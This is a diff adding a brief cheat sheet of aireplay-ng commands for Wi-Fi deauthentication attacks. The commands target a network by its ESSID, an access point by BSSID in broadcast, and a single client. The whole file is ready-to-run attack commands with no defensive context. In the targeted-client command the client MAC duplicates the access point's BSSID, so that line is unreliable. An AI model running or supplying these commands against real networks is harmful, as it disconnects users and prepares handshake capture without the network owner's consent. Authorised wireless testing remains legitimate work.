@@ -1,0 +1,9 @@
+##Deauth using ESSID
+	aireplay-ng --deauth 1 -e Counter_Strike1 wlan0mon
+
+##Deauth Using BSSID of Access Point (Broadcast)
+	aireplay-ng --deauth 1 -b 14:B4:84:B0:5A:B8 wlan0mon
+
+##Deauth Using BSSID of AP to a targeted Client
+	aireplay-ng --deauth 1 -b 14:B4:84:B0:5A:B8 -c 14:B4:84:B0:5A:B8 wlan0mon
+
